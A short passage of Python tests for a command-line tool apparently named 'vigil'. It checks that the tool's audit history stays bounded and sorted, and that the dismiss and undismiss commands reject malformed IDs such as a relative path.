    p.write_text(json.dumps(state))
    hist = v.audit()["history"]
    assert len(hist) == v.HISTORY_MAX
    assert all(re.fullmatch(r"\d{4}-\d{2}-\d{2}", h["date"]) and 0 <= h["score"] <= 100 for h in hist)
    assert hist == sorted(hist, key=lambda h: h["date"])


def test_cli_dismiss_rejects_bad_ids():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["dismiss", "../x"], ["dismiss"], ["undismiss", "A"], ["dismiss", "a", "b"]):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args
